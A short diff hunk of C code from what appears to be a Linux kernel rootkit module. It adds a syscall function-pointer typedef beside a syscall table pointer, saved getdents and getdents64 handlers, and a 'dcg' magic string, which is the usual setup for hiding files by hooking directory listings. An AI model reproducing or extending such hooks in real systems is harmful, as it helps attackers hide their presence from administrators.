@@ -4,6 +4,7 @@
 #define MAGIC "dcg"
 
 unsigned long *__sysc_table;
+typedef asmlinkage (*t_syscall)(const struct pt_regs *);
 static t_syscall orig_getdents64;
 static t_syscall orig_getdents;
 
